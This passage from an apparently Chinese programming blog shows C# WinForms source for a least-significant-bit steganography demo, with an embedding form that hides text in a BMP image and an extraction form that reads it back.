class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Drawing<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>IO<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Forms<span class="token punctuation">;</span><span class="token keyword">namespace</span> LSBAlgorithmDemo<span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">partial</span> <span class="token keyword">class</span> <span class="token class-name">InfoEmbedmentFrm</span> <span class="token punctuation">:</span> Form    <span class="token punctuation">{</span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 定义全局变量</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> fileName<span class="token punctuation">;</span>        <span class="token keyword">private</span> LSBHelper lsb<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> msg <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> MemoryStream memStream <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 构造函数</span>        <span class="token keyword">public</span> <span class="token function">InfoEmbedmentFrm</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">InitializeComponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 初始化界面</span>            <span class="token function">Form_Init</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 设置显示界面</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 设置显示界面</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="flag">0:初始化、下载之后;1:图片加载之后;2:图片嵌入之后</span>        <span class="token comment" spellcheck="true">/// &lt;/param></span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">Form_Init</span><span class="token punctuation">(</span><span class="token keyword">int</span> flag<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//初始化、下载之后</span>            <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 设置界面显示的起始位置</span>                <span class="token keyword">this</span><span class="token punctuation">.</span>StartPosition <span class="token operator">=</span> FormStartPosition<span class="token punctuation">.</span>CenterScreen<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// PictureBox控件</span>                pBoxDisplay<span class="token punctuation">.</span>SizeMode <span class="token operator">=</span> PictureBoxSizeMode<span class="token punctuation">.</span>StretchImage<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 两个必须都要设置（因两次的加载途径不一样）</span>                pBoxDisplay<span class="token punctuation">.</span>ImageLocation <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                pBoxDisplay<span class="token punctuation">.</span>Image <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// RichTextBox控件</span>                rtbInfo<span class="token punctuation">.</span><span class="token function">Clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                rtbInfo<span class="token punctuation">.</span>ReadOnly <span class="token operator">=</span> <span class="token keyword">true</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// Button控件</span>                btnDownloadImage<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">false</span><span class="token punctuation">;</span>                btnEmbedInfo<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">false</span><span class="token punctuation">;</span>                btnLoadImage<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">true</span><span class="token punctuation">;</span>                btnLoadImage<span class="token punctuation">.</span><span class="token function">Focus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//图片加载之后</span>            <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// RichTextBox控件</span>                rtbInfo<span class="token punctuation">.</span><span class="token function">Clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                rtbInfo<span class="token punctuation">.</span>ReadOnly <span class="token operator">=</span> <span class="token keyword">false</span><span class="token punctuation">;</span>                rtbInfo<span class="token punctuation">.</span><span class="token function">Focus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// Button控件</span>                btnDownloadImage<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">false</span><span class="token punctuation">;</span>                btnEmbedInfo<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">true</span><span class="token punctuation">;</span>                btnLoadImage<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//图片嵌入之后</span>            <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// Button控件</span>                btnDownloadImage<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">true</span><span class="token punctuation">;</span>                btnEmbedInfo<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">true</span><span class="token punctuation">;</span>                btnLoadImage<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">true</span><span class="token punctuation">;</span>                btnDownloadImage<span class="token punctuation">.</span><span class="token function">Focus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 加载图片的事件</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnLoadImage_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 再次单击加载图片按钮时，回到初始化状态</span>            <span class="token function">Form_Init</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 设置打开对话框的标题</span>            openImageDialog<span class="token punctuation">.</span>Title <span class="token operator">=</span> <span class="token string">"请选择一张位图"</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 对文件格式进行筛选</span>            openImageDialog<span class="token punctuation">.</span>Filter <span class="token operator">=</span> <span class="token string">"bmp | *.bmp;*.BMP"</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 默认设置为空</span>            openImageDialog<span class="token punctuation">.</span>FileName <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>openImageDialog<span class="token punctuation">.</span><span class="token function">ShowDialog</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> DialogResult<span class="token punctuation">.</span>OK<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 存储打开文件的全文件名</span>                fileName <span class="token operator">=</span> openImageDialog<span class="token punctuation">.</span>FileName<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 设置显示图片的样式</span>                pBoxDisplay<span class="token punctuation">.</span>SizeMode <span class="token operator">=</span> PictureBoxSizeMode<span class="token punctuation">.</span>StretchImage<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 加载要显示的图片</span>                pBoxDisplay<span class="token punctuation">.</span>ImageLocation <span class="token operator">=</span> fileName<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 设置显示界面</span>                <span class="token function">Form_Init</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 嵌入文本的事件</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnEmbedInfo_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 已经在界面设置中代替</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">.</span><span class="token function">IsNullOrWhiteSpace</span><span class="token punctuation">(</span>fileName<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token string">"请选择一张位图"</span><span class="token punctuation">,</span> <span class="token string">"提示"</span><span class="token punctuation">,</span> MessageBoxButtons<span class="token punctuation">.</span>OK<span class="token punctuation">,</span> MessageBoxIcon<span class="token punctuation">.</span>Information<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">.</span><span class="token function">IsNullOrWhiteSpace</span><span class="token punctuation">(</span>rtbInfo<span class="token punctuation">.</span>Text<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token string">"请输入要嵌入的文本信息"</span><span class="token punctuation">,</span> <span class="token string">"提示"</span><span class="token punctuation">,</span> MessageBoxButtons<span class="token punctuation">.</span>OK<span class="token punctuation">,</span> MessageBoxIcon<span class="token punctuation">.</span>Information<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                lsb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LSBHelper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>lsb<span class="token punctuation">.</span><span class="token function">EmbedInfo</span><span class="token punctuation">(</span>fileName<span class="token punctuation">,</span> rtbInfo<span class="token punctuation">.</span>Text<span class="token punctuation">,</span> <span class="token keyword">out</span> msg<span class="token punctuation">,</span> <span class="token keyword">out</span> memStream<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    pBoxDisplay<span class="token punctuation">.</span>ImageLocation <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">//pBoxDisplay.ImageLocation = "C:\\Users\\ss\\Desktop\\664204.bmp";</span>                    pBoxDisplay<span class="token punctuation">.</span>Image <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token function">FromStream</span><span class="token punctuation">(</span>memStream<span class="token punctuation">)</span><span class="token punctuation">;</span>                    MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> <span class="token string">"提示"</span><span class="token punctuation">,</span> MessageBoxButtons<span class="token punctuation">.</span>OK<span class="token punctuation">,</span> MessageBoxIcon<span class="token punctuation">.</span>Information<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// 设置显示界面</span>                    <span class="token function">Form_Init</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span>                <span class="token punctuation">{</span>                    MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> <span class="token string">"提示"</span><span class="token punctuation">,</span> MessageBoxButtons<span class="token punctuation">.</span>OK<span class="token punctuation">,</span> MessageBoxIcon<span class="token punctuation">.</span>Error<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 下载图片按钮触发的事件</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnDownloadImage_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>memStream <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                saveImageDialog<span class="token punctuation">.</span>Filter <span class="token operator">=</span> <span class="token string">"位图（*.bmp）|*.bmp"</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>saveImageDialog<span class="token punctuation">.</span><span class="token function">ShowDialog</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> DialogResult<span class="token punctuation">.</span>OK<span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    FileStream fs <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                    BinaryWriter bw <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                    <span class="token keyword">try</span>                    <span class="token punctuation">{</span>                        fs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileStream</span><span class="token punctuation">(</span>saveImageDialog<span class="token punctuation">.</span>FileName<span class="token punctuation">,</span> FileMode<span class="token punctuation">.</span>Create<span class="token punctuation">,</span> FileAccess<span class="token punctuation">.</span>Write<span class="token punctuation">)</span><span class="token punctuation">;</span>                        bw <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BinaryWriter</span><span class="token punctuation">(</span>fs<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">// 指针回位（每次操作之前都要先操作一下）</span>                        memStream<span class="token punctuation">.</span>Position <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                        <span class="token keyword">while</span> <span class="token punctuation">(</span>memStream<span class="token punctuation">.</span>Position <span class="token operator">!=</span> memStream<span class="token punctuation">.</span>Length<span class="token punctuation">)</span>                        <span class="token punctuation">{</span>                            <span class="token comment" spellcheck="true">// ReadByte()强制转换成Int32类型</span>                            <span class="token keyword">byte</span> write <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">ToByte</span><span class="token punctuation">(</span>memStream<span class="token punctuation">.</span><span class="token function">ReadByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            bw<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>write<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                        MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token string">"图片下载成功"</span><span class="token punctuation">,</span> <span class="token string">"提示"</span><span class="token punctuation">,</span> MessageBoxButtons<span class="token punctuation">.</span>OK<span class="token punctuation">,</span> MessageBoxIcon<span class="token punctuation">.</span>Information<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">//设置显示界面</span>                        <span class="token function">Form_Init</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> ex<span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span>ex<span class="token punctuation">.</span>Message<span class="token punctuation">,</span> <span class="token string">"提示"</span><span class="token punctuation">,</span> MessageBoxButtons<span class="token punctuation">.</span>OK<span class="token punctuation">,</span> MessageBoxIcon<span class="token punctuation">.</span>Information<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">finally</span>                    <span class="token punctuation">{</span>                        fs<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        bw<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>提取界面</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Algorithm/LSB/提取界面.png" alt="提取界面"></center><p><strong>提取界面代码</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>IO<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Forms<span class="token punctuation">;</span><span class="token keyword">namespace</span> LSBAlgorithmDemo<span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">partial</span> <span class="token keyword">class</span> <span class="token class-name">InfoExtractionFrm</span> <span class="token punctuation">:</span> Form    <span class="token punctuation">{</span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 定义全局变量</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> fileName<span class="token punctuation">;</span>        <span class="token keyword">private</span> MemoryStream memorystream <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> info <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> msg <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 构造函数</span>        <span class="token keyword">public</span> <span class="token function">InfoExtractionFrm</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">InitializeComponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 初始化展示界面</span>            <span class="token function">Form_Init</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 界面设置操作</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 界面设置操作</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="flag"></span>        <span class="token comment" spellcheck="true">/// 0:初始化</span>        <span class="token comment" spellcheck="true">/// 1:提取之后</span>        <span class="token comment" spellcheck="true">/// &lt;/param></span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">Form_Init</span><span class="token punctuation">(</span><span class="token keyword">int</span> flag<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 设置界面显示位置</span>                <span class="token keyword">this</span><span class="token punctuation">.</span>StartPosition <span class="token operator">=</span> FormStartPosition<span class="token punctuation">.</span>CenterScreen<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 设置PictureBox控件</span>                pBoxDisplay<span class="token punctuation">.</span>SizeMode <span class="token operator">=</span> PictureBoxSizeMode<span class="token punctuation">.</span>StretchImage<span class="token punctuation">;</span>                pBoxDisplay<span class="token punctuation">.</span>ImageLocation <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 设置RichTextBox控件</span>                rtbInfo<span class="token punctuation">.</span><span class="token function">Clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                rtbInfo<span class="token punctuation">.</span>ReadOnly <span class="token operator">=</span> <span class="token keyword">true</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 设置Button控件</span>                btnLoadImage<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">true</span><span class="token punctuation">;</span>                btnExtractInfo<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 设置RichTextBox控件</span>                rtbInfo<span class="token punctuation">.</span><span class="token function">Clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 设置Button控件</span>                btnLoadImage<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">true</span><span class="token punctuation">;</span>                btnExtractInfo<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 加载图片</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnLoadImage_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">Form_Init</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 设置打开对话框的标题</span>            openImageDialog<span class="token punctuation">.</span>Title <span class="token operator">=</span> <span class="token string">"请选择一张已嵌入信息的位图"</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 对文件格式进行筛选</span>            openImageDialog<span class="token punctuation">.</span>Filter <span class="token operator">=</span> <span class="token string">"bmp | *.bmp;*.BMP"</span><span class="token punctuation">;</span>            openImageDialog<span class="token punctuation">.</span>FileName <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>openImageDialog<span class="token punctuation">.</span><span class="token function">ShowDialog</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> DialogResult<span class="token punctuation">.</span>OK<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 存储打开文件的全文件名</span>                fileName <span class="token operator">=</span> openImageDialog<span class="token punctuation">.</span>FileName<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 设置显示图片的样式</span>                pBoxDisplay<span class="token punctuation">.</span>SizeMode <span class="token operator">=</span> PictureBoxSizeMode<span class="token punctuation">.</span>StretchImage<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 加载要显示的图片</span>                pBoxDisplay<span class="token punctuation">.</span>ImageLocation <span class="token operator">=</span> fileName<span class="token punctuation">;</span>                <span class="token function">Form_Init</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 提取信息</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnExtractInfo_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 图片是否加载</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">.</span><span class="token function">IsNullOrWhiteSpace</span><span class="token punctuation">(</span>fileName<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token string">"请选嵌入文字的位图"</span><span class="token punctuation">,</span> <span class="token string">"提示"</span><span class="token punctuation">,</span> MessageBoxButtons<span class="token punctuation">.</span>OK<span class="token punctuation">,</span> MessageBoxIcon<span class="token punctuation">.</span>Information<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                <span class="token keyword">try</span>                <span class="token punctuation">{</span>                    LSBHelper lsb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LSBHelper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// 将图像存入内存流中</span>                    <span class="token keyword">using</span> <span class="token punctuation">(</span>FileStream fileReadStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileStream</span><span class="token punctuation">(</span>fileName<span class="token punctuation">,</span> FileMode<span class="token punctuation">.</span>Open<span class="token punctuation">,</span> FileAccess<span class="token punctuation">.</span>Read<span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        <span class="token keyword">using</span> <span class="token punctuation">(</span>BinaryReader br <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BinaryReader</span><span class="token punctuation">(</span>fileReadStream<span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token punctuation">{</span>                            <span class="token keyword">byte</span> write<span class="token punctuation">;</span>                            memorystream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MemoryStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> fileReadStream<span class="token punctuation">.</span>Length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>                            <span class="token punctuation">{</span>                                write <span class="token operator">=</span> br<span class="token punctuation">.</span><span class="token function">ReadByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                memorystream<span class="token punctuation">.</span><span class="token function">WriteByte</span><span class="token punctuation">(</span>write<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token comment" spellcheck="true">// 回位操作</span>                            memorystream<span class="token punctuation">.</span>Position <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                    <span class="token comment" spellcheck="true">// 信息提取</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>lsb<span class="token punctuation">.</span><span class="token function">ExtractInfo</span><span class="token punctuation">(</span>memorystream<span class="token punctuation">,</span> <span class="token keyword">out</span> info<span class="token punctuation">,</span> <span class="token keyword">out</span> msg<span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        <span class="token comment" spellcheck="true">// 将提取到的信息展示在文本控件中</span>                        rtbInfo<span class="token punctuation">.</span>Text <span class="token operator">=</span> info<span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">else</span>                    <span class="token punctuation">{</span>                        MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> <span class="token string">"警告"</span><span class="token punctuation">,</span> MessageBoxButtons<span class="token punctuation">.</span>OK<span class="token punctuation">,</span> MessageBoxIcon<span class="token punctuation">.</span>Warning<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> ex<span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span>ex<span class="token punctuation">.</span>Message<span class="token punctuation">,</span> <span class="token string">"警告"</span><span class="token punctuation">,</span> MessageBoxButtons<span class="token punctuation">.</span>OK<span class="token punctuation">,</span> MessageBoxIcon<span class="token punctuation">.</span>Warning<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">finally</span>                <span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">// 释放占用的资源</span>                    memorystream<span class="token punctuation">.</span><span class="token function">Dispose</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token 